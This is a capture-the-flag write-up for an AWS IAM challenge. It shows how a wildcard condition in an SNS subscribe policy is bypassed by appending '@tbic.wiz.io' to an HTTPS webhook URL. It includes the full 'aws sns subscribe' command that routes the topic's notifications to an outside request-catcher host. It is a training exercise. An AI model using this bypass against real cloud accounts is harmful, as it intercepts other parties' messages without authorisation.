Challenge 3: Enable Push Notifications
I got a message for you. Can you get it?

IAM Policy
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    }
This IAM policy allows anyone to subscribe to the SNS TBICWizPushNotifications topic, provided that the endpoint ends with @tbic.wiz.io.

Since I don’t have an email ending with that domain, I used another protocol to subscribe to it.

I used HTTPS protocol along with this tool: RequestCatcher to receive notifications.

I created a unique URL using https://Vishwaben.requestcatcher.com and appended /@tbic.wiz.io at the end, like this:


https://Vishwaben.requestcatcher.com/@tbic.wiz.io
Then, I subscribed to the SNS topic using the following command:

aws sns subscribe \
    --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications \
    --protocol https \
    --notification-endpoint https://Vishwaben.requestcatcher.com/@tbic.wiz.io
Subscription Confirmation
I received a subscription confirmation message in my webhook dashboard.
To confirm the subscription, I visited the SubscribeURL included in the message.

Once confirmed, I started receiving notifications containing a message with the flag.

Flag: {wiz:your-flag-here}

